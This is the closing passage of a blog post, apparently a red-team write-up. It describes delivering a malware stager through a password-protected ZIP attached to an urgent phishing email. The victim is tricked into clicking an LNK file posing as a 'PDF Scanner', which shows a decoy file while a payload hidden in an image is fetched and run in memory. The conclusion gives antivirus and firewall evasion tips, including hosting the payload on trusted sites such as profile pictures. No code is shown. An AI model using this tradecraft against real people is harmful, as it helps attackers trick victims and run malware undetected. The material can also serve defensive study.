+<p><a href="https://www.win-rar.com/download.html?&amp;L=0">Download the appropiate Windows version of Winrar at their official site.</a></p>
+<p><strong>Double click and follow the installation wizard.</strong></p>
+<h5 id="zipping-and-encrypting-phish-payload">Zipping and Encrypting Phish Payload<a href="#zipping-and-encrypting-phish-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p><strong>Start WinRar</strong></p>
+<p>Navigate to the directory that all of the files are in -&gt; CTRL + Click each file -&gt; Click Add</p>
+<p>(Archive format) Select ZIP -&gt; Change Archive name to what you want the zip file to be called (This will also be the name of the folder that all the contents will reside in once the zip file is extracted)</p>
+<p>(Click set password) -&gt; Enter password required to open/decrypt zip file -&gt; Check the ZIP legacy encryption (This will make it comptabile to be opened on most operating systems)</p>
+<p>All done. Once a convincing phishing email is drafted the encrypted zip can be attached and sent off. In the email contents one could stress urgency and provide the instructions on downloading and extracting the contents. Including the password they need to decrypt it. If the phish is convincing enough the user will follow the directions and click the LNK file that will trigger our embedded image payload to execute as well.</p>
+<h5 id="test-out-the-phish-payload">Test out the Phish Payload<a href="#test-out-the-phish-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>Make sure to keep a backup copy of your files because the powershell stager is meant to clean up after itself and remove some of the artifacts. In my scenario the user is prompted to verify a payment confirmation. The LNK file is named PDF scanner with mention in the email that encryption and virus scanning has been added for the user&rsquo;s security. Once they click the &ldquo;PDF Scanner&rdquo; the decoy file will appear as if it had been scanned and then provided to the user.</p>
+<p>Move the encrypted zip folder to the downloads folder as that&rsquo;s where it would most likely end up when downloaded from an email. Extract the zip to the current directory and provide the password when prompted. Only the LNK file should be visible. When we double click the LNK file in our case we will see calc.exe appear as well as the decoy file in the Downloads directory.</p>
+<p>This is what the embedded image payload retrieval looks like from a network perspective.</p>
+<p><img src="/cybernautblog/redteam_post_2/network_pcap.png" alt="Packet Capture"></p>
+<p>As you can see with some clever domain naming and file paths it can look like a legitimate HTTP request that will blend in with traffic on the network. If someone were to visit that url or load the image they would see a image that fits the context of the web domain. In this case Mario artwork.</p>
+<hr>
+<h1 id="conclusion">[Conclusion]<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>There are many obstacles to overcome when attempting to get an initial foothold on a target machine that is running AV. From the delivery mechanism to intial code execution and using the stager to pull down more payloads there are many different security solutions at play. Through combinations of phishing, encryption, and encoding we create a complete execution chain. On top of that we simplify and compartmentalize different components to decrease our chances of detection. <strong>When the execution chain is completed we are set up to run subsequent payloads in memory.</strong></p>
+<p>While this defeats AV it is the minimial required to even begin thinking about evading EDRs. The more it is understood how these detections work we can combine and create custom methods to work around these. This is where behavioral and in memory detections are needed. Those are another topic that I will save for a different blog considering how much we already covered.</p>
+<p>Another layer of obfuscation that could of been utilized is encrypting the stager payload or embedded image payload itself and decrypting these at run time.This is effective against AV and even sometimes EDRs.</p>
+<p>Being able to covertly execute code in memory by sending a http get request to retrieve an image is very cool, but it is of no use if you don&rsquo;t already have code execution on the target machine. Of course many factors are at play when it comes to phishing effectivness. The scenario I described was generic and to demonstrate a method of delivery for the stager.</p>
+<p>One Cybernaut tip before you go. After creating my image payload I ran it through virus total and it came back clean. Of course increasing the complexity of the payload embedded within the image might increase the chance of detection. In this scenario most likely with enough obfuscation even complex payloads will pass signature checks if they are not already passing by using basic encoding. This means that you would be able to host this image on any site that allows you to upload an image and that you can retrive the full path url to that image and let is serve as your payload host instead of a personal server. For example a dummy social media account profile picture, or in a comment section, or any site that meets those conditions. <strong>The biggest thing here is that in this scenario your stager payload can reach out to an already existing trusted &ldquo;safe&rdquo; domain bypassing alot of firewall policies.</strong> Increasing the chances of your stager being able to retrieve the payload to execute in memory.</p>
+<p>Doing this process sparked many more ideas in methods of evasion, encoding/encryption, and phishing delivery.</p>
+<p>Enjoy.</p>
+<p><img src="/cybernautblog/signature/cybernaut_001.gif" alt="Cynernaut 001"></p>
+<p>-Isaiah Miller (Cybernaut #001)</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/cybernautblog/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
